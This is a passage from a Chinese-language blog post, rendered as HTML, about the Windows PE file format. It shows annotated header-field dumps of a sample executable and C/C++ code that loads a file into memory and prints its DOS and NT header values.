class=\"number\">0005</span>D8CD</span><br><span class=\"line\">    WORD    Subsystem;\t\t\t\t\t\t<span class=\"number\">0020</span></span><br><span class=\"line\">    WORD    DllCharacteristics;\t\t\t\tC160</span><br><span class=\"line\">    DWORD   SizeOfStackReserve;\t\t\t\t<span class=\"number\">00080000</span>\t<span class=\"comment\">//初始化时保留的堆栈大小</span></span><br><span class=\"line\">    DWORD   SizeOfStackCommit;\t\t\t\t<span class=\"number\">00000000</span></span><br><span class=\"line\">    DWORD   SizeOfHeapReserve;\t\t\t\t<span class=\"number\">00004000</span></span><br><span class=\"line\">    DWORD   SizeOfHeapCommit;\t\t\t\t<span class=\"number\">00000000</span></span><br><span class=\"line\">    DWORD   LoaderFlags;\t\t\t\t\t<span class=\"number\">00100000</span>\t</span><br><span class=\"line\">    DWORD   NumberOfRvaAndSizes;\t\t\t<span class=\"number\">00000000</span>\t<span class=\"comment\">//目录项目数</span></span><br><span class=\"line\">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class=\"line\">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br><span class=\"line\"><span class=\"comment\">//0xE0</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//Unpacker.exe</span><br><span class=\"line\">typedef struct _IMAGE_DOS_HEADER &#123;      // DOS .EXE header</span><br><span class=\"line\">    WORD   e_magic;  5A4D                     // Magic number MZ标记用于判断是否是可执行文件\t\t\t\t\t\t\t\t</span><br><span class=\"line\">    WORD   e_cblp;   0090                   // Bytes on last page of file</span><br><span class=\"line\">    WORD   e_cp;     0003                   // Pages in file</span><br><span class=\"line\">    WORD   e_crlc;   0000                   // Relocations</span><br><span class=\"line\">    WORD   e_cparhdr;   0004                // Size of header in paragraphs</span><br><span class=\"line\">    WORD   e_minalloc;  0000                // Minimum extra paragraphs needed</span><br><span class=\"line\">    WORD   e_maxalloc;  FFFF                // Maximum extra paragraphs needed</span><br><span class=\"line\">    WORD   e_ss;  0000                      // Initial (relative) SS value</span><br><span class=\"line\">    WORD   e_sp;  00B8                      // Initial SP value</span><br><span class=\"line\">    WORD   e_csum;  0000                     // Checksum</span><br><span class=\"line\">    WORD   e_ip;    0000                     // Initial IP value</span><br><span class=\"line\">    WORD   e_cs;    0000                    // Initial (relative) CS value</span><br><span class=\"line\">    WORD   e_lfarlc;     0040                // File address of relocation table</span><br><span class=\"line\">    WORD   e_ovno;       0000               // Overlay number</span><br><span class=\"line\">    WORD   e_res[4];     0000 0000 0000 0000               // Reserved words</span><br><span class=\"line\">    WORD   e_oemid;      0000               // OEM identifier (for e_oeminfo)</span><br><span class=\"line\">    WORD   e_oeminfo;    0000               // OEM information; e_oemid specific</span><br><span class=\"line\">    WORD   e_res2[10];   0000 0000 0000 0000 0000 0000 0000 0000 0000 0000               // Reserved words</span><br><span class=\"line\">    DWORD  e_lfanew;     0000 0108               // File address of new exe header PE头相对于文件的偏移，定位PE文件</span><br><span class=\"line\">&#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br><span class=\"line\">//0x40</span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">typedef struct _IMAGE_NT_HEADERS &#123;</span><br><span class=\"line\">    DWORD Signature;    00004550</span><br><span class=\"line\">    IMAGE_FILE_HEADER FileHeader;</span><br><span class=\"line\">    IMAGE_OPTIONAL_HEADER32 OptionalHeader;</span><br><span class=\"line\">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br><span class=\"line\">//</span><br><span class=\"line\"></span><br><span class=\"line\">typedef struct _IMAGE_FILE_HEADER &#123;</span><br><span class=\"line\">    WORD    Machine;        014C   //程序运行的CPU型号，0x0任何处理器，0x14 386及后续处理器</span><br><span class=\"line\">    WORD    NumberOfSections;    0004   //文件中节的总数，要新增或者合并节，修改值</span><br><span class=\"line\">    DWORD   TimeDateStamp;     491D4B09   //时间戳：文件创建时间，编译器填写</span><br><span class=\"line\">    DWORD   PointerToSymbolTable; 00000000  </span><br><span class=\"line\">    DWORD   NumberOfSymbols;   00000000</span><br><span class=\"line\">    WORD    SizeOfOptionalHeader;   00E0   //可选PE投大小，32位默认E0H，64位默认F0，大小可以自定义</span><br><span class=\"line\">    WORD    Characteristics;     010F      //可执行文件尾10F</span><br><span class=\"line\">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br><span class=\"line\">//0x14</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">typedef struct _IMAGE_OPTIONAL_HEADER &#123;</span><br><span class=\"line\">    WORD    Magic;\t\t 10B     //10B32位下PE   20B64位下pe</span><br><span class=\"line\">    BYTE    MajorLinkerVersion; 06</span><br><span class=\"line\">    BYTE    MinorLinkerVersion; 00</span><br><span class=\"line\">    DWORD   SizeOfCode;  11000     //所有代码节的和，必须是FileAlignment的整数倍，编译器填的没用</span><br><span class=\"line\">    DWORD   SizeOfInitializedData;  2F000    //已初始化数据大小的和必须是FileAlignment的整数倍，编译器填的没用</span><br><span class=\"line\">    DWORD   SizeOfUninitializedData; 00000000   //未初始化数据大小的和必须是FileAlignment的整数倍，编译器填的没用</span><br><span class=\"line\">    DWORD   AddressOfEntryPoint;   10D4F     //程序入口</span><br><span class=\"line\">    DWORD   BaseOfCode;\t\t\t00001000\t\t//代码开始的基址</span><br><span class=\"line\">    DWORD   BaseOfData;\t\t\t12000\t\t//数据开始的基址</span><br><span class=\"line\">    DWORD   ImageBase;\t\t\t400000\t\t//内存镜像地址</span><br><span class=\"line\">    DWORD   SectionAlignment;\t00001000        //内存对齐</span><br><span class=\"line\">    DWORD   FileAlignment;\t\t00001000        //文件对齐</span><br><span class=\"line\">    WORD    MajorOperatingSystemVersion;\t0004\t\t</span><br><span class=\"line\">    WORD    MinorOperatingSystemVersion;    0000</span><br><span class=\"line\">    WORD    MajorImageVersion;\t\t\t\t0000</span><br><span class=\"line\">    WORD    MinorImageVersion;\t\t\t\t0000</span><br><span class=\"line\">    WORD    MajorSubsystemVersion;\t\t\t0004</span><br><span class=\"line\">    WORD    MinorSubsystemVersion;\t\t\t0000</span><br><span class=\"line\">    DWORD   Win32VersionValue;\t\t\t\t00000000</span><br><span class=\"line\">    DWORD   SizeOfImage;\t\t\t\t\t41000    //内存中整个PE文件的映射的尺寸，必须是FileAlignment的整数倍，即拉伸后大小，imagebuffer</span><br><span class=\"line\">    DWORD   SizeOfHeaders;\t\t\t\t\t1000    //所有头+节表按照文件对齐后的大小，严格按照FileAlignment对齐</span><br><span class=\"line\">    DWORD   CheckSum;\t\t\t\t\t\t00000000  //每两个字节相加，存到checksum，存不下自然溢出</span><br><span class=\"line\">    WORD    Subsystem;\t\t\t\t\t\t0002</span><br><span class=\"line\">    WORD    DllCharacteristics;\t\t\t\t0000</span><br><span class=\"line\">    DWORD   SizeOfStackReserve;\t\t\t\t100000\t//初始化时保留的堆栈大小</span><br><span class=\"line\">    DWORD   SizeOfStackCommit;\t\t\t\t1000</span><br><span class=\"line\">    DWORD   SizeOfHeapReserve;\t\t\t\t100000</span><br><span class=\"line\">    DWORD   SizeOfHeapCommit;\t\t\t\t1000</span><br><span class=\"line\">    DWORD   LoaderFlags;\t\t\t\t\t00000000\t</span><br><span class=\"line\">    DWORD   NumberOfRvaAndSizes;\t\t\t00000010\t//目录项目数</span><br><span class=\"line\">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class=\"line\">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br><span class=\"line\">//E0</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230203150643470.png\" alt=\"image-20230203150643470\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230204150314850.png\" alt=\"image-20230204150314850\"></p>\n<p>将文件读取到内存中，此时称 FileBuffer，如果内存对齐和文件对齐一样，那么不拉伸，但还是不能直接加载</p>\n<p>如果两者不一样，需要先在内存中进行拉伸，此事成为 image buffer</p>\n<p>image buffer 从 imagebase 开始</p>\n<p>imagebase 用于模块对齐和保护指针</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230301170240621.png\" alt=\"image-20230301170240621\"></p>\n<p>正常情况下 OEP 在 text 代码段中，OEP 真正的位置 = OEP + imagebase</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdlib.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;malloc.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> FILEPATH <span class=\"string\">&quot;C:\\\\Users\\\\shinya\\\\Desktop\\\\Unpacker.exe&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">LPVOID <span class=\"title function_\">ReadPELoader</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> len = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tFILE *fp = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tLPVOID pFileBuffer = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfp = fopen(FILEPATH, <span class=\"string\">&quot;rb&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (fp == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;fp = NULL&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfseek(fp, <span class=\"number\">0</span>, SEEK_END);</span><br><span class=\"line\"></span><br><span class=\"line\">\tlen = ftell(fp);</span><br><span class=\"line\"></span><br><span class=\"line\">\tfseek(fp, <span class=\"number\">0</span>, SEEK_SET);</span><br><span class=\"line\"></span><br><span class=\"line\">\tpFileBuffer = <span class=\"built_in\">malloc</span>(len);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!pFileBuffer)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;ptr = NULL&quot;</span>);</span><br><span class=\"line\">\t\tfclose(fp);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">size_t</span> reader = fread(pFileBuffer, len, <span class=\"number\">1</span>, fp);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!reader)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;reader= 0&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">free</span>(pFileBuffer);</span><br><span class=\"line\">\t\tpFileBuffer = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t\tfclose(fp);</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s\\n&quot;</span>, pFileBuffer);</span><br><span class=\"line\">\tfclose(fp);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> pFileBuffer;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">PrintNTHeader</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tLPVOID pFileBuffer = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_DOS_HEADER pDosHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_NT_HEADERS pNTHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_FILE_HEADER pPEHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_OPTIONAL_HEADER32 pOptionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_SECTION_HEADER pSectionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpFileBuffer = ReadPELoader();</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!pFileBuffer)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;文件读取失败&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (*((PWORD)pFileBuffer) != IMAGE_DOS_SIGNATURE)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;不是有效mz标识&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">free</span>(pFileBuffer);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tpDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;MZ标志:%X\\n&quot;</span>, pDosHeader-&gt;e_magic);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;PE偏移:%X\\n&quot;</span>, pDosHeader-&gt;e_lfanew);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//判断是否是有效的PE标志</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (*((PDWORD)((DWORD)pFileBuffer + pDosHeader-&gt;e_lfanew)) != IMAGE_NT_SIGNATURE)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;不是有效的PE标志\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">free</span>(pFileBuffer);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//打印NT头</span></span><br><span class=\"line\">\tpNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pFileBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;NT:%X\\n&quot;</span>, pNTHeader-&gt;Signature);</span><br><span class=\"line\">\tpPEHeader = (PIMAGE_FILE_HEADER)(((DWORD)pNTHeader) + <span class=\"number\">4</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;PE:%X\\n&quot;</span>, pPEHeader-&gt;Machine);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;节的数量:%X\\n&quot;</span>, pPEHeader-&gt;NumberOfSections);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;SizeOfOptionalHeader:%X\\n&quot;</span>, pPEHeader-&gt;SizeOfOptionalHeader);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//可选PE头</span></span><br><span class=\"line\">\tpOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pPEHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Optional_PE:%X\\n&quot;</span>, pOptionHeader-&gt;Magic);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">free</span>(pFileBuffer);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tPrintNTHeader();</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">LPVOID <span class=\"title\">OpenFile</span><span class=\"params\">(<span class=\"type\">char</span>* FilePath)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tFILE* fp;</span><br><span class=\"line\">\tfp = <span class=\"built_in\">fopen</span>(FilePath,<span class=\"string\">&quot;rb&quot;</span>);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(fp == <span class=\"literal\">NULL</span>) <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">fseek</span>(fp,<span class=\"number\">0</span>,SEEK_END);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//获得文件指针长度</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> len = <span class=\"built_in\">ftell</span>(fp);  </span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">fseek</span>(fp,<span class=\"number\">0</span>,SEEK_SET);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//开辟堆区</span></span><br><span class=\"line\">\tLPVOID ptr;</span><br><span class=\"line\">\tptr = (LPVOID)<span class=\"built_in\">malloc</span>(len);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(ptr == <span class=\"literal\">NULL</span>) </span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tcout&lt;&lt; <span class=\"string\">&quot;ptr == NULL&quot;</span> &lt;&lt; <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">free</span>(ptr);</span><br><span class=\"line\">\t\t<span class=\"built_in\">fclose</span>(fp);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//初始化</span></span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(ptr,<span class=\"number\">0</span>,len);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//读文件</span></span><br><span class=\"line\">\t<span class=\"type\">size_t</span> reader = <span class=\"built_in\">fread</span>(ptr,len,<span class=\"number\">1</span>,fp);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(reader == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tcout&lt;&lt; <span class=\"string\">&quot;reader == NULL&quot;</span> &lt;&lt; <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">free</span>(ptr);</span><br><span class=\"line\">\t\t<span class=\"built_in\">fclose</span>(fp);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">fclose</span>(fp);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ptr;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">ResolvePEHeader</span><span class=\"params\">(<span 